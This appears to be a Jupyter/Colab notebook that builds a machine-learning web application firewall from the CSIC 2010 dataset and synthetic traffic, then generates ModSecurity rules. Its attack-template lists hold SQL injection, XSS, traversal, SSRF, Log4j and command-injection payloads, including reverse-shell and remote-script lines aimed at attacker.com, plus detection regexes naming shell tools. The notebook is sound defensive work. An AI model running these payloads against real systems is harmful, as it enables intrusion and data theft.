# 🛡️ Enterprise WAF: End-to-End Machine Learning Pipeline
### **100% Deterministic & Reproducible (Exact Same Dataset & Model as Local Training)**

สมุดงานนี้ประกอบด้วยโค้ดต้นฉบับเดียวกับที่รันบนเครื่อง Local และ VPS 100%:
* 🔒 **Fixed Random Seeds (`seed=42`)**: ล็อคค่าสุ่มทั้งหมด ทำให้ผลลัพธ์ Accuracy, ROC-AUC, Weights, และ Trees ออกมา**เหมือนเดิมเป๊ะทุกประการ**
* 📥 **Automatic CSIC 2010 + Modern Payloads Synthesis**: ดาวน์โหลด CSIC 2010 จาก GitHub + สร้าง Benign/Attack ชุดเดิมเป๊ะ
* 🔬 **Exact Feature Engineering**: สกัดคุณลักษณะ 13 มิติ (Entropy, Regex, Special Chars, SQL Operators, SSRF, SSTI, Traversal)
* 🤖 **Random Forest & Isolation Forest**: เทรนโมเดลด้วย Hyperparameters เดียวกัน
* 💾 **Direct Export to `.joblib`**: เซฟและดาวน์โหลดไฟล์โมเดลลงเครื่องเพื่อนำไปแทนที่บนเซิร์ฟเวอร์ WAF ได้ทันที

## 📦 Step 1: Install Dependencies

In [ ]:
# Install dependencies in Colab environment
!pip install -q scikit-learn pandas numpy matplotlib seaborn joblib

import os
import re
import math
import json
import uuid
import random
import joblib
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from typing import Dict, Union, List, Any

import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns

from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.metrics import (
    accuracy_score, precision_recall_fscore_support,
    roc_curve, roc_auc_score, confusion_matrix, classification_report
)

# Set exact random seeds for 100% deterministic reproducibility
random.seed(42)
np.random.seed(42)

print("✅ Environment initialized with Seed=42!")

## 📥 Step 2: Download Dataset & Generate Synthetic Traffic (Exact Same Code as Local)

In [ ]:
# Clean standalone version of download_dataset.py
CSIC_CSV_URL = "https://raw.githubusercontent.com/msudol/Web-Application-Attack-Datasets/master/CSVData/csic_final.csv"

print("[*] Downloading CSIC 2010 dataset from GitHub...")
try:
    csic_df = pd.read_csv(CSIC_CSV_URL)
    print(f"[+] CSIC 2010 loaded: {len(csic_df)} rows")
except Exception as e:
    print(f"[!] Warning: Failed to download CSIC ({e}). Creating fallback dataset.")
    csic_df = pd.DataFrame()

# Benign Traffic Constants
BENIGN_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact", "/terms", "/privacy",
    "/api/v1/health", "/api/v1/status", "/metrics", "/ping",
    "/login", "/register", "/auth/login", "/auth/register", "/auth/logout",
    "/api/v1/users", "/api/v1/users/profile", "/api/v1/settings",
    "/products", "/categories", "/items", "/search", "/catalog",
    "/checkout", "/cart", "/order/status", "/billing", "/invoice",
    "/dashboard", "/dashboard/analytics", "/dashboard/reports",
    "/blog", "/news", "/posts", "/articles", "/faq", "/support", "/feedback",
    "/assets/css/main.css", "/assets/js/bundle.js", "/favicon.ico", "/images/logo.png"
]
BENIGN_SEARCH_WORDS = [
    "laptop", "gaming monitor", "mechanical keyboard", "wireless mouse",
    "usb-c cable", "smart watch", "bluetooth headphones", "leather jacket",
    "coffee maker", "standing desk", "docker tutorial", "python web dev",
    "microservices architecture", "cloud security", "cyber threat intel",
    "รองเท้าวิ่ง", "เสื้อยืดคอกลม", "อาหารแมว", "กระเป๋าเดินทาง", "โปรโมชั่นพิเศษ"
]
BENIGN_FIRST_NAMES = ["Alice", "Bob", "Charlie", "David", "Emma", "Somchai", "Somsak", "Supaporn", "Kanya", "Thanawat"]
BENIGN_LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Rattanasiri", "Sukprasert", "Phonphong", "Wong"]
BENIGN_DOMAINS = ["gmail.com", "outlook.com", "yahoo.com", "company.co.th", "university.ac.th", "enterprise.org"]

def generate_synthetic_benign(count: int = 25000) -> list:
    records = []
    clean_routes = [
        "/", "/index.html", "/home", "/about", "/contact", "/terms", "/privacy",
        "/api/v1/health", "/api/v1/status", "/metrics", "/ping", "/robots.txt", "/sitemap.xml",
        "/login", "/register", "/auth/login", "/auth/register", "/auth/logout",
        "/dashboard", "/dashboard/analytics", "/dashboard/reports", "/dashboard/settings",
        "/products", "/categories", "/catalog", "/checkout", "/cart", "/order/status",
        "/blog", "/news", "/posts", "/articles", "/faq", "/support", "/feedback",
        "/favicon.ico", "/assets/css/main.css", "/assets/js/bundle.js", "/images/logo.png"
    ]
    for i in range(count):
        choice = random.random()
        if choice < 0.30:
            base_route = random.choice(clean_routes)
            uri = f"{base_route}/{str(uuid.uuid4()) if random.random() > 0.5 else str(random.randint(1, 99999))}" if random.random() > 0.6 else base_route
            records.append({"URI": uri, "GET-Query": "", "POST-Data": "", "Method": "GET", "Class": "Valid"})
        elif choice < 0.65:
            if random.random() > 0.4:
                term = urllib.parse.quote(random.choice(BENIGN_SEARCH_WORDS))
                cat = random.choice(["electronics", "clothing", "books", "home", "appliances", "automotive", "tech", "gaming"])
                query = f"q={term}&category={cat}&min_price={random.randint(10, 500)}&max_price={random.randint(500, 5000)}&page={random.randint(1, 20)}&sort=asc"
                uri = "/search" if random.random() > 0.5 else "/products"
            else:
                query = f"page={random.randint(1, 50)}&limit={random.choice([10, 20, 25, 50, 100])}&sort={random.choice(['created_at', 'price', 'name', 'popularity', 'rating'])}&order={random.choice(['asc', 'desc'])}"
                uri = f"/api/v1/{random.choice(['users', 'items', 'orders', 'logs', 'reports'])}"
            records.append({"URI": uri, "GET-Query": query, "POST-Data": "", "Method": "GET", "Class": "Valid"})
        elif choice < 0.85:
            fname = random.choice(BENIGN_FIRST_NAMES)
            lname = random.choice(BENIGN_LAST_NAMES)
            email = f"{fname.lower()}.{lname.lower()}{random.randint(1,99)}@{random.choice(BENIGN_DOMAINS)}"
            user_id = random.randint(1000, 99999)
            target_path = random.choice(["/api/v1/auth/login", "/api/v1/users", "/api/v1/settings", "/api/v1/cart/add"])
            if "login" in target_path or "auth" in target_path:
                body = f'{{"username": "{email}", "password": "UserPass{random.randint(1000, 9999)}!", "remember_me": true}}'
            else:
                body = f'{{"id": {user_id}, "name": "{fname} {lname}", "email": "{email}", "role": "user", "active": true}}'
            records.append({"URI": target_path, "GET-Query": "", "POST-Data": body, "Method": "POST", "Class": "Valid"})
        else:
            fname = random.choice(BENIGN_FIRST_NAMES)
            lname = random.choice(BENIGN_LAST_NAMES)
            email = f"{fname.lower()}@{random.choice(BENIGN_DOMAINS)}"
            body = f"username={fname.lower()}{random.randint(1,99)}&password=Password{random.randint(100,999)}!&remember=1"
            records.append({"URI": "/login", "GET-Query": "", "POST-Data": body, "Method": "POST", "Class": "Valid"})
    return records

# Attack Traffic Constants
SQLI_TEMPLATES = [
    "admin' OR '1'='1' --", "admin' OR 1=1 #", "1' OR 'a'='a", "') OR ('1'='1' --",
    "1 UNION SELECT 1,2,username,password FROM users-- -",
    "1' UNION ALL SELECT NULL, NULL, table_name FROM information_schema.tables--",
    "1' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -", "1; WAITFOR DELAY '0:0:5'--",
    "1; DROP TABLE users;--", "1' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY '<?php phpinfo();?>'--"
]
XSS_TEMPLATES = [
    "<script>alert('XSS_ATTACK')</script>", "<script src='http://attacker.com/hook.js'></script>",
    "<img src=x onerror=alert(document.domain)>", "<svg/onload=alert(document.cookie)>",
    "<body onload=alert('XSS')>", "<iframe src=\"javascript:alert(`XSS`)\"></iframe>",
    "javascript:alert(1)", "\"><script>eval(atob('YWxlcnQoMSk='))</script>"
]
TRAVERSAL_TEMPLATES = [
    "../../../../etc/passwd", "../../../../etc/shadow", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "/proc/self/environ", "/windows/win.ini"
]
RCE_TEMPLATES = [
    "; cat /etc/passwd", "| cat /etc/shadow", "&& whoami", "| id", "`uname -a`", "$(whoami)",
    "; nc -e /bin/sh attacker.com 4444", "; curl http://attacker.com/malware.sh | sh", "cat${IFS}/etc/passwd"
]
SSRF_TEMPLATES = [
    "http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:8080/admin", "http://localhost:9000/internal-api", "dict://127.0.0.1:6379/info"
]
SSTI_TEMPLATES = ["{{7*7}}", "{{config.items()}}", "${7*7}", "#{7*7}", "{{''.__class__.__mro__[1].__subclasses__()}}"]
NOSQL_LOG4J_TEMPLATES = ['{"$gt": ""}', '{"$ne": null}', '{"$where": "this.password.match(/.*/)"}', "${jndi:ldap://attacker.com/a}"]

def mutate_payload(payload: str) -> str:
    mutated = payload
    op = random.random()
    if op < 0.25:
        mutated = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in mutated)
    elif op < 0.45 and " " in mutated:
        mutated = mutated.replace(" ", "/**/")
    elif op < 0.65:
        mutated = urllib.parse.quote(mutated)
    elif op < 0.80:
        mutated = urllib.parse.quote(urllib.parse.quote(mutated))
    else:
        mutated = mutated.replace(" ", "+")
    return mutated

def generate_synthetic_attacks(count: int = 8000) -> list:
    records = []
    all_categories = [
        ("SQLi", SQLI_TEMPLATES), ("XSS", XSS_TEMPLATES), ("Traversal", TRAVERSAL_TEMPLATES),
        ("RCE", RCE_TEMPLATES), ("SSRF", SSRF_TEMPLATES), ("SSTI", SSTI_TEMPLATES), ("NoSQL_Log4j", NOSQL_LOG4J_TEMPLATES)
    ]
    for i in range(count):
        cat_name, templates = random.choice(all_categories)
        base_payload = random.choice(templates)
        payload = mutate_payload(base_payload) if random.random() > 0.4 else base_payload
        method = "POST" if random.random() > 0.55 else "GET"
        target_uri = random.choice(["/login", "/login.php", "/api/v1/auth", "/search", "/products", "/api/v1/users", "/download"])
        if method == "POST":
            body = f"data={payload}" if random.random() > 0.5 else f'{{"input": "{payload}"}}'
            records.append({"URI": target_uri, "GET-Query": "", "POST-Data": body, "Method": "POST", "Class": "Anomalous"})
        else:
            query = f"id={payload}" if random.random() > 0.5 else f"q={payload}"
            records.append({"URI": target_uri, "GET-Query": query, "POST-Data": "", "Method": "GET", "Class": "Anomalous"})
    return records

print("[*] Generating 25,000 synthetic benign requests...")
df_benign = pd.DataFrame(generate_synthetic_benign(25000))

print("[*] Generating 8,000 synthetic attack payloads...")
df_attacks = pd.DataFrame(generate_synthetic_attacks(8000))

if not csic_df.empty:
    combined_df = pd.concat([csic_df, df_attacks, df_benign], ignore_index=True)
else:
    combined_df = pd.concat([df_attacks, df_benign], ignore_index=True)

combined_df["Label"] = combined_df["Class"].apply(lambda x: 1 if str(x).strip().lower() in ["anomalous", "1"] else 0)
print(f"[+] Dataset Ready! Total Samples: {len(combined_df)} (Benign: {sum(combined_df['Label'] == 0)}, Attack: {sum(combined_df['Label'] == 1)})")

## 🔬 Step 3: Exact Feature Extraction (13 Numerical Features)

In [ ]:
SPECIAL_CHARS = set("'\"`;<>\\$()|`^~*#{}[]")
ATTACK_KEYWORD_PATTERN = re.compile(
    r"(?i)("
    r"select\s+|union\s+(?:all\s+)?select|insert\s+into|update\s+\w+\s+set|delete\s+from|"
    r"drop\s+(?:table|database)|exec\s*\(|where\s+|from\s+|or\s+['\"]?1['\"]?\s*=\s*['\"]?1|"
    r"and\s+['\"]?1['\"]?\s*=\s*['\"]?1|sleep\s*\(\s*\d+\s*\)|benchmark\s*\(|information_schema|"
    r"into\s+(?:out|dump)file|load_file\s*\(|concat\s*\(|pg_sleep|"
    r"<script|javascript:|alert\s*\(|eval\s*\(|onerror\s*=|onload\s*=|document\.cookie|"
    r"<svg|<iframe|<img\s+[^>]*onerror|<body\s+onload|fetch\s*\(|"
    r"\.\./|\.\.\\|/etc/passwd|/etc/shadow|/proc/self|boot\.ini|win\.ini|"
    r"(?:\||;|`|&&|\$\()\s*(?:cat|nc|wget|curl|bash|sh|whoami|id|uname|python|perl|powershell)\b|"
    r"/bin/sh|/bin/bash|\$\{IFS\}|"
    r"169\.254\.169\.254|metadata\.google\.internal|127\.0\.0\.1|localhost|"
    r"\{\{.*?\}\}|\$\{.*?\}|\#\{.*?\}|"
    r"\$gt|\$ne|\$where|\$regex|\$or|\$eq|"
    r"\$\{jndi:(?:ldap|rmi|dns):"
    r")"
)

HTML_TAG_PATTERN = re.compile(r"<[a-zA-Z/][^>]*>", re.IGNORECASE)
SQL_OP_PATTERN = re.compile(r"(?i)\b(union\s+select|or\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+|and\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+|select\s+.*?\s+from|drop\s+table|exec\s*\()\b")
SSRF_PATTERN = re.compile(r"(?i)(169\.254\.169\.254|localhost|127\.0\.0\.1|metadata\.google|internal\.corp)")
SSTI_NOSQL_PATTERN = re.compile(r"(\{\{.*?\}\}|\$\{.*?\}|\#\{.*?\}|\$ne|\$gt|\$where|\$regex|\$\{jndi:)")

def calculate_shannon_entropy(text: str) -> float:
    if not text:
        return 0.0
    prob = [float(text.count(c)) / len(text) for c in set(text)]
    return -sum(p * math.log2(p) for p in prob)

def extract_features_from_request(url: str = "", method: str = "GET", body: str = "") -> Dict[str, Union[int, float]]:
    decoded_url = urllib.parse.unquote(urllib.parse.unquote(str(url or "")))
    decoded_body = urllib.parse.unquote(urllib.parse.unquote(str(body or "")))
    payload_str = f"{decoded_url} {decoded_body}".strip()
    payload_len = max(len(payload_str), 1)
    combined_str = f"{method} {decoded_url} {decoded_body}".strip()

    special_char_count = sum(1 for char in payload_str if char in SPECIAL_CHARS)
    raw_param_count = decoded_url.count('&') + (1 if '=' in decoded_url else 0)

    quote_single_diff = abs(combined_str.count("'") % 2)
    quote_double_diff = abs(combined_str.count('"') % 2)
    quote_unbalanced = 1 if (quote_single_diff + quote_double_diff) > 0 else 0

    return {
        "url_length": len(decoded_url),
        "body_length": len(decoded_body),
        "combined_entropy": calculate_shannon_entropy(combined_str),
        "special_char_count": special_char_count,
        "special_char_ratio": special_char_count / payload_len,
        "param_count": raw_param_count,
        "method_is_post": 1 if method.upper() == "POST" else 0,
        "attack_keyword_count": len(ATTACK_KEYWORD_PATTERN.findall(combined_str)),
        "html_tag_count": len(HTML_TAG_PATTERN.findall(combined_str)),
        "path_traversal_depth": combined_str.count('../') + combined_str.count('..\\') + combined_str.count('..%2f'),
        "has_sql_operator": 1 if SQL_OP_PATTERN.search(combined_str) else 0,
        "has_ssrf_token": 1 if SSRF_PATTERN.search(combined_str) else 0,
        "has_ssti_nosql": 1 if SSTI_NOSQL_PATTERN.search(combined_str) else 0,
    }

FEATURE_COLUMNS = [
    "url_length", "body_length", "combined_entropy", "special_char_count",
    "special_char_ratio", "param_count", "method_is_post", "attack_keyword_count",
    "html_tag_count", "path_traversal_depth", "has_sql_operator", "has_ssrf_token",
    "has_ssti_nosql"
]
print(f"[+] Feature Pipeline ready. Features count: {len(FEATURE_COLUMNS)}")

## ⚡ Step 4: Extract Features & Perform Stratified Train-Test Split

In [ ]:
print("[*] Extracting features from dataset (this may take ~20-30 seconds)...")
features_list = []
labels = []

for idx, row in combined_df.iterrows():
    uri = str(row["URI"]) if pd.notna(row.get("URI")) else ""
    get_query = str(row["GET-Query"]) if pd.notna(row.get("GET-Query")) else ""
    post_data = str(row["POST-Data"]) if pd.notna(row.get("POST-Data")) else ""
    method = str(row["Method"]) if pd.notna(row.get("Method")) else "GET"
    full_url = f"{uri}?{get_query}" if get_query else uri

    feat = extract_features_from_request(url=full_url, method=method, body=post_data)
    features_list.append(feat)
    labels.append(row["Label"])

X = pd.DataFrame(features_list)[FEATURE_COLUMNS]
y = pd.Series(labels)

# 75% Train, 25% Test with Seed 42
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.25, random_state=42, stratify=y
)

print(f"[+] Split completed:")
print(f"    - Train set: {len(X_train)} samples (Normal: {sum(y_train==0)}, Attack: {sum(y_train==1)})")
print(f"    - Test set:  {len(X_test)} samples (Normal: {sum(y_test==0)}, Attack: {sum(y_test==1)})")

## 🤖 Step 5: Model Training (Exact Same Hyperparameters)

In [ ]:
# 1. Supervised Random Forest Classifier
print("[*] Training Random Forest Classifier (n_estimators=200, max_depth=20, min_samples_leaf=3)...")
rf_model = RandomForestClassifier(
    n_estimators=200,
    max_depth=20,
    min_samples_split=6,
    min_samples_leaf=3,
    class_weight="balanced",
    random_state=42,
    n_jobs=-1
)
rf_model.fit(X_train, y_train)
print("✅ Random Forest Model trained successfully!")

# 2. Unsupervised Isolation Forest Anomaly Detector
X_train_benign = X_train[y_train == 0]
actual_contamination = max(0.01, min(0.15, sum(y_train == 1) / len(y_train)))
print(f"[*] Training Isolation Forest (n_estimators=150, contamination={actual_contamination:.4f})...")
iso_model = IsolationForest(n_estimators=150, contamination=actual_contamination, random_state=42, n_jobs=-1)
iso_model.fit(X_train_benign)
print("✅ Isolation Forest Model trained successfully!")

## 📊 Step 6: Evaluation Metrics & Charts (Accuracy, ROC-AUC, Confusion Matrix)

In [ ]:
y_pred_test = rf_model.predict(X_test)
y_prob_test = rf_model.predict_proba(X_test)[:, 1]

accuracy = float(accuracy_score(y_test, y_pred_test))
roc_auc = float(roc_auc_score(y_test, y_prob_test))
cm = confusion_matrix(y_test, y_pred_test)

print("=" * 60)
print(f"🎯 Final Model Accuracy: {accuracy * 100:.2f}%")
print(f"📈 ROC-AUC Score:        {roc_auc:.4f}")
print("=" * 60)
print("\nClassification Report:")
print(classification_report(y_test, y_pred_test, target_names=["Normal (Benign)", "Attack (Anomalous)"]))

# Plotting Evaluation Charts
fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(14, 5))

# Confusion Matrix Heatmap
sns.heatmap(cm, annot=True, fmt="d", cmap="Blues", cbar=False, ax=ax1,
            xticklabels=["Normal (0)", "Attack (1)"], yticklabels=["Normal (0)", "Attack (1)"])
ax1.set_title("Confusion Matrix Heatmap")
ax1.set_xlabel("Predicted Class")
ax1.set_ylabel("True Class")

# ROC Curve
fpr, tpr, _ = roc_curve(y_test, y_prob_test)
ax2.plot(fpr, tpr, color="crimson", lw=2, label=f"ROC Curve (AUC = {roc_auc:.4f})")
ax2.plot([0, 1], [0, 1], color="navy", lw=1.5, linestyle="--")
ax2.set_title("Receiver Operating Characteristic (ROC)")
ax2.set_xlabel("False Positive Rate")
ax2.set_ylabel("True Positive Rate")
ax2.legend(loc="lower right")
ax2.grid(True, alpha=0.3)

plt.tight_layout()
plt.show()

## ⚙️ Step 7: Automated ModSecurity WAF Rule Generator

In [ ]:
def auto_generate_secrule(url: str, method: str = "GET", body: str = "") -> str:
    feat_df = pd.DataFrame([extract_features_from_request(url=url, method=method, body=body)])[FEATURE_COLUMNS]
    prob = float(rf_model.predict_proba(feat_df)[0][1])
    is_anomaly = bool(prob > 0.5)

    if not is_anomaly:
        return f"🟢 Clean Request (Threat Probability: {prob*100:.1f}%) - No Rule Needed."

    raw = urllib.parse.unquote(f"{url} {body}")
    if re.search(r"union\s+select", raw, re.I):
        pattern = r"@rx (?i)union\s+select"
        atk = "SQL Injection"
    elif re.search(r"<script|javascript:|onerror\s*=", raw, re.I):
        pattern = r"@rx (?i)(<script|javascript:|onerror\s*=)"
        atk = "Cross-Site Scripting (XSS)"
    elif "../" in raw:
        pattern = r"@rx (\.\./|\.\.\\)"
        atk = "Path Traversal"
    elif re.search(r"(\||;|`)\s*(cat|nc|wget|curl|bash)", raw, re.I):
        pattern = r"@rx (?i)(?:\||;|`)\s*(cat|nc|wget|curl|bash)"
        atk = "Command Injection (RCE)"
    else:
        pattern = f"@rx {re.escape(url[:30])}"
        atk = "Anomaly Threat"

    secrule = f"""# -----------------------------------------------------
# 🛡️ ML Auto-Generated ModSecurity WAF Rule
# Threat Detected: {atk} (Confidence: {prob*100:.1f}%)
# -----------------------------------------------------
SecRule REQUEST_URI|REQUEST_BODY "{pattern}" \
    "id:1000501,\
    phase:2,\
    deny,\
    status:403,\
    severity:CRITICAL,\
    log,\
    msg:'ML Auto-Generated WAF Rule: Blocked {atk}'"""
    return secrule

print("=== TEST 1: Normal Search Request ===")
print(auto_generate_secrule("/search?q=wireless+keyboard&category=tech"))

print("\n=== TEST 2: SQL Injection Attack ===")
print(auto_generate_secrule("/search?q=admin' UNION SELECT null, password FROM users --"))

print("\n=== TEST 3: XSS Attack ===")
print(auto_generate_secrule("/comment?text=<script>alert(document.cookie)</script>"))

## 💾 Step 8: Save & Download Trained Models (.joblib)

In [ ]:
os.makedirs("models_export", exist_ok=True)
rf_path = "models_export/random_forest_waf.joblib"
iso_path = "models_export/isolation_forest_waf.joblib"
meta_path = "models_export/model_metadata.json"

joblib.dump(rf_model, rf_path)
joblib.dump(iso_model, iso_path)

metadata = {
    "trained_at": datetime.now(timezone.utc).isoformat(),
    "accuracy": accuracy,
    "roc_auc": roc_auc,
    "features": FEATURE_COLUMNS,
    "n_estimators": 200
}

with open(meta_path, "w", encoding="utf-8") as f:
    json.dump(metadata, f, indent=2)

print(f"✅ Random Forest saved to:   {rf_path}")
print(f"✅ Isolation Forest saved to: {iso_path}")
print(f"✅ Model Metadata saved to:   {meta_path}")

# Auto-download files in Google Colab environment
try:
    from google.colab import files
    print("[*] Automatically downloading model files to your browser...")
    files.download(rf_path)
    files.download(iso_path)
    files.download(meta_path)
except ImportError:
    print("[*] Running locally. Model files available in models_export/ directory.")